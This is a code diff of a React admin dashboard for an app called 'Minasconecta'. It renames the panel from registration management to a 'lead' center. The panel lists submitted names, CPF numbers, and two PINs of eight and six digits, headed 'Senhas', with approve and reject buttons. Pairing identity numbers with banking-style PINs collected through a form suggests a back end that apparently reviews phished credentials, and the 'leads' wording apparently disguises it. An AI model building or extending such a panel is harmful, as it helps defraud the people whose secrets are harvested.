@@ -207,13 +207,96 @@ function maskedPin(value) {
 const ADMIN_STATUS_LABELS = { PENDING: "Pendente", APPROVED: "Aprovado", REJECTED: "Rejeitado" };
 
 function AdminDashboard({ onLogout }) {
-  const [query, setQuery] = useState(""); const [rows, setRows] = useState([]); const [error, setError] = useState(""); const [loading, setLoading] = useState(true); const [saving, setSaving] = useState("");
-  async function load() { setLoading(true); try { setRows(await adminPaymentsRequest()); setError(""); } catch (loadError) { setError(loadError.message); } finally { setLoading(false); } }
+  const [query, setQuery] = useState("");
+  const [rows, setRows] = useState([]);
+  const [error, setError] = useState("");
+  const [loading, setLoading] = useState(true);
+  const [saving, setSaving] = useState("");
+  async function load() {
+    setLoading(true);
+    try { setRows(await adminPaymentsRequest()); setError(""); }
+    catch (loadError) { setError(loadError.message); }
+    finally { setLoading(false); }
+  }
   useEffect(() => { const timer = window.setTimeout(load, 0); return () => window.clearTimeout(timer); }, []);
-  async function updateRow(id, adminStatus) { setSaving(id); try { await adminPaymentsRequest({ action: "update", id, adminStatus }); setRows((current) => current.map((row) => row.id === id ? { ...row, admin_status: adminStatus } : row)); } catch (updateError) { setError(updateError.message); } finally { setSaving(""); } }
-  const filteredRows = rows.filter((row) => `${row.client_name || ""} ${row.cpf} ${row.identifier} ${row.transaction_id || ""} ${row.protocol || ""}`.toLowerCase().includes(query.toLowerCase()));
+  async function updateRow(id, adminStatus) {
+    setSaving(id);
+    try {
+      await adminPaymentsRequest({ action: "update", id, adminStatus });
+      setRows((current) => current.map((row) => row.id === id ? { ...row, admin_status: adminStatus } : row));
+    } catch (updateError) { setError(updateError.message); }
+    finally { setSaving(""); }
+  }
+  const filteredRows = rows.filter((row) => `${row.client_name || ""} ${row.cpf} ${row.protocol || ""} ${row.identifier || ""}`.toLowerCase().includes(query.toLowerCase()));
+  const pending = rows.filter((row) => row.admin_status === "PENDING").length;
   const approved = rows.filter((row) => row.admin_status === "APPROVED").length;
-  return <main className="admin-shell"><header className="admin-topbar"><strong>Minasconecta</strong><button type="button" onClick={onLogout}>Sair</button></header><div className="admin-content"><div className="admin-heading"><div><span className="admin-kicker">GESTÃO DE CADASTROS</span><h1>Painel Administrativo</h1></div><span className="admin-live"><i /> Sistema online</span></div><section className="stats-grid"><div><span>Total de cadastros</span><strong>{rows.length}</strong><small>Registros reais</small></div><div><span>Aguardando análise</span><strong>{rows.filter((row) => row.admin_status === "PENDING").length}</strong><small>Precisam de decisão</small></div><div><span>Liberados</span><strong className="green-number">{approved}</strong><small>Processos aprovados</small></div></section><section className="records-card"><div className="records-head"><div><h2>Cadastros</h2><p>Aprove ou rejeite as solicitações de cadastro</p></div><input type="search" placeholder="Buscar por nome, CPF ou protocolo..." value={query} onChange={(event) => setQuery(event.target.value)} /></div>{error && <p className="admin-error admin-table-error">{error}</p>}{loading ? <div className="admin-loading"><span className="spinner" /> Carregando cadastros...</div> : <div className="table-wrap"><table><thead><tr><th>CPF</th><th>Nome / Protocolo</th><th>PIN 8</th><th>PIN 6</th><th>Data/Hora</th><th>Liberação</th><th>Ações</th></tr></thead><tbody>{filteredRows.map((row) => <tr key={row.id}><td>{row.cpf}</td><td><strong>{row.client_name || "Nome não informado"}</strong><span className="stage-badge protocol-badge">Protocolo: {row.protocol || "—"}</span></td><td>{maskedPin(row.pin8)}</td><td>{maskedPin(row.pin6)}</td><td>{new Date(row.created_at).toLocaleString("pt-BR")}</td><td><span className={`status-badge status-${String(row.admin_status).toLowerCase()}`}>{ADMIN_STATUS_LABELS[row.admin_status] || row.admin_status}</span></td><td className="actions"><button type="button" disabled={saving === row.id || row.admin_status === "APPROVED"} onClick={() => updateRow(row.id, "APPROVED")}>✓ Aprovar</button><button type="button" disabled={saving === row.id || row.admin_status === "REJECTED"} onClick={() => updateRow(row.id, "REJECTED")}>× Rejeitar</button></td></tr>)}</tbody></table></div>}<div className="pagination"><span>{filteredRows.length} registros exibidos</span><button type="button" onClick={load}>Atualizar</button></div></section></div></main>;
+  const rejected = rows.filter((row) => row.admin_status === "REJECTED").length;
+  return (
+    <main className="admin-shell">
+      <header className="admin-topbar">
+        <strong>Minasconecta</strong>
+        <button type="button" onClick={onLogout}>Sair</button>
+      </header>
+      <div className="admin-content">
+        <div className="admin-heading">
+          <div>
+            <span className="admin-kicker">AQUISIÇÃO DE LEADS</span>
+            <h1>Central de Leads</h1>
+            <p className="admin-subtitle">Acompanhe e qualifique os cadastros recebidos pelo formulário.</p>
+          </div>
+          <span className="admin-live"><i /> Sistema online</span>
+        </div>
+        <section className="stats-grid">
+          <div><span>Total de leads</span><strong>{rows.length}</strong><small>Cadastros recebidos</small></div>
+          <div><span>Novos leads</span><strong>{pending}</strong><small>Aguardando análise</small></div>
+          <div><span>Aprovados</span><strong className="green-number">{approved}</strong><small>Leads qualificados</small></div>
+          <div><span>Rejeitados</span><strong className="red-number">{rejected}</strong><small>Não qualificados</small></div>
+        </section>
+        <section className="records-card">
+          <div className="records-head">
+            <div>
+              <h2>Leads recebidos</h2>
+              <p>Aprove ou rejeite os leads captados pelo formulário</p>
+            </div>
+            <input type="search" placeholder="Buscar por nome, CPF ou protocolo..." value={query} onChange={(event) => setQuery(event.target.value)} />
+          </div>
+          {error && <p className="admin-error admin-table-error">{error}</p>}
+          {loading ? (
+            <div className="admin-loading"><span className="spinner" /> Carregando leads...</div>
+          ) : (
+            <div className="table-wrap">
+              <table>
+                <thead>
+                  <tr><th>Lead</th><th>CPF</th><th>Protocolo</th><th>Senhas</th><th>Data/Hora</th><th>Status</th><th>Ações</th></tr>
+                </thead>
+                <tbody>
+                  {filteredRows.length === 0 && <tr><td className="admin-empty" colSpan={7}>Nenhum lead recebido ainda.</td></tr>}
+                  {filteredRows.map((row) => (
+                    <tr key={row.id}>
+                      <td><strong>{row.client_name || "Nome não informado"}</strong></td>
+                      <td>{row.cpf}</td>
+                      <td><span className="stage-badge protocol-badge">{row.protocol || "—"}</span></td>
+                      <td><span className="pin-badge">8: {maskedPin(row.pin8)}</span><span className="pin-badge">6: {maskedPin(row.pin6)}</span></td>
+                      <td>{new Date(row.created_at).toLocaleString("pt-BR")}</td>
+                      <td><span className={`status-badge status-${String(row.admin_status).toLowerCase()}`}>{ADMIN_STATUS_LABELS[row.admin_status] || row.admin_status}</span></td>
+                      <td className="actions">
+                        <button type="button" disabled={saving === row.id || row.admin_status === "APPROVED"} onClick={() => updateRow(row.id, "APPROVED")}>✓ Aprovar</button>
+                        <button type="button" disabled={saving === row.id || row.admin_status === "REJECTED"} onClick={() => updateRow(row.id, "REJECTED")}>✕ Rejeitar</button>
+                      </td>
+                    </tr>
+                  ))}
+                </tbody>
+              </table>
+            </div>
+          )}
+          <div className="pagination">
+            <span>{filteredRows.length} lead(s) exibido(s)</span>
+            <button type="button" onClick={load}>Atualizar</button>
+          </div>
+        </section>
+      </div>
+    </main>
+  );
 }
 
 export default function App() {
